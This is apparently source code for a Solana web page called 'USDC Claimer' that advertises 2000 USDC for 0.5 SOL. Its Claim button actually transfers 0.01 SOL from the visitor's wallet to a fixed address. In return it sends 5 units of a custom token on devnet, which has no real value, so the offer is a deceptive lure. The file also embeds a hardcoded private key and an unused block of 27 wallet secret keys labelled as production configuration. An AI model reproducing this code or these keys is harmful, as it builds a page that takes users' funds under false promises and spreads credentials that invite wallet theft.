/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "39eX3Weob9HPANXYkR2CHn5TUgSk2Ld2hYU1TTjsZ7Jwfe5pEs9o4REGAUsX9P6rTKzNyVksGQUVwRTKEFBNMeNi"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2mJSwoGGjkNim9bhbVnuYgMqjpuzE9YqjWF4zTjir9mHr2fW4GoLprp1MfRJnxB4AgGatgFtDN9nbb12vyBDVG9A",
  "key1": "42QgSfToGt44JNqiXUb3bCQ2WCGgCKpAWYEEMGWWsbqUWB9yL6eZ4fndMLvHKiC6HasVujrRDKymTYzHxnekaPNC",
  "key2": "mqmyPxvHVy7VyhegBsxGerv53ZWkUaQQQ1d3Td71iMQZUg6RbD2XroSdNDyik5jsmycHbUkbCMvqMrtyooY2PHg",
  "key3": "LoWSsnBRgzEWSX6quN1QGMEgwQdP5rbLQyccPadp91MDRpj5uxbTiKUTB7atFrpvEDy5tqTwVdjnYbQA6LqFRTc",
  "key4": "2pzXMrNW6L6SXroXWhfGSMgcKS8yMdPALPg5TQZtt5Rj2B8Ef3QP6E8S3LoT2C6VSdcRg4q8ekB9vbTWVyYTa8n2",
  "key5": "5emsfYEVdsLvFDivJhzzQQZW4CSGHZVAhLa6ibTmZp3ptFJeQjTLMs3uCpcGkZWMar9pzmUTdG8mwzGtWTUaWrET",
  "key6": "3SCRZPqgqEF89WxuGj8V1d7p3wFfm2ntpWFmsPeBFNt1RDWthYLDJoXc3C7tcptR4m9rivQViC1bCsBCENH5KynV",
  "key7": "2CE5zoteodvF8ZkoBWRw3LnCKpbTCysLm8X1Q1uHEhjggkTKfqt4Fd7n2n4dWRmbfDEFD8SSGNTyij19bUVzz4Vu",
  "key8": "5kTsvtDqQAaANGDDtyQ8duxKMSUYqCBuNm1x1NYzx1e9P4NQCk83zn2UQHw2HDBqyMpd13UxjTNbP91bXoeKrdHD",
  "key9": "hHfJarJNh23QhnHM3PhuRgMAg67gacnkB3w9JZqYSGjXWEktEtv1gxFrkVx8N7d3VL4nvyYyD3BLPNfzX7peP6f",
  "key10": "4MexVHcNKYzLiRJnb8LDr4ktHSmfyTLYapHudteMVAbXnrw2CuUC3DAUs6fC13MFktfJnbwJxd1F8zXnXCsi7GnX",
  "key11": "CXf5zP41fCRipmcACmGdgupJijdi5LMiybrdovBwqn7VZtjWKfeiQhG6MUgjKcCoWSs62kcyEhFF26zVXKrfahA",
  "key12": "4SaUmGfGFtMxx13oUh2VJc7r3dg2jcL3MTNjkiVYQuwuYRYHnQ7UACcD91P7CDC5yqpEJj99d73q51cxpduv4UsG",
  "key13": "5oqeW5k6EmzLfisxL4DJnoCizZeVbsg14iMLPPxwMvmcatQfqGicVpbFMniPgegmtEk8rJnGt4HAkgnYYreB8iZT",
  "key14": "23cgxsKPqDfvRyE5YGQNrYn9USZPY6423SK4uhwFusVCA5LP6Pv4K39rSuovqdriwGF4xMAyNdqsfj7jvj33acJy",
  "key15": "3xUUEnbDEnXpkHHXmZt2B8h7QsiTSbLW4yaHMyf9BafCCjjrwmbCTv1GS7DHnmH9hPw35XEv3dX5GrjVWkcg5TcL",
  "key16": "2nguDgqJDPqRbs4MRTZVg27NRm6QqhJoRZSnYYUi2ajhxfUEsN8DxFPfS7a1iHsxyudBSTrKYXqm9g8obekv9UMe",
  "key17": "35Utftbz7quTcwuYs2YJmg8Hpy2wg9NVB4kvhSbhbGwMrBR5SFe1yjEmCxz6Xd9Gxpn9Rrjpe33Yktqa1CwuQeJF",
  "key18": "66ZJYByZquHhtcZF7YVpuTminJc67SfAqW6yvmgTd1pLrKd4jeRG9MLuKGVXzUBbWttUc44cDXjeqz7Um3yHN7iK",
  "key19": "58k1ug5DrqCbMt8pcgqkLSXGJjnpPXt3Vu12xDMTD9WGx8yX1z4BBNcXXLBx8PRUJrxKYvGdK94rAt2nzT7S4sMk",
  "key20": "622pEvKGZ28CxERacivfKwC2cE1ADBjxu9MGk5s3e4bvyKJkjyiRk69GT7x3vkcv1CYf9R6wdym3hXK3jMEvrrUd",
  "key21": "3iu9h1y7K88B5kuMdwi1LkuCKcnXufjgKd4aTvaNagSD1b419zSaAQXk5viPEqfh55JD1De1ER7TCwjZxkddcoV3",
  "key22": "2jCrAqV3YRPJXqpJA1KYQF3tggHvWMsKbKEa1VHBtSwBvwkyHWtf9eA2XGcEvcNVBnBuFJWYy2x5dqEEZp3wTaA7",
  "key23": "4pBZh4627NYTKQzFsZYosR3jx5aFSj2VZhg6mndhjRpqtxnDQsrrJAcnxiE3y7BtF3uSgPwwpWxnDtEpJh4k8vbK",
  "key24": "5hfjR6YaPRsvjV8adA6iPnkfhw3rv17TFiusCcRbfiCdGdhVzVXS1TUuTW3U87gBoA1cRJ5NyvGEyPPfGzg6tGgw",
  "key25": "syNoDG7XMbEZmCACjgPeGa7mNRmqjrMfTYRWsiWf8cYi9zcQtCJpyNR9SHFn5EWeMs43BnYcnQsRBuBGBx4x2s8",
  "key26": "5mUBewdHYyDTqEiEwFwYmqLZ6AnCau1o7fUN1ayMPMV2ztynfdyH2zo5A9VtvHjenGsohAR2YGKHuJBqWuoWgjbu"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
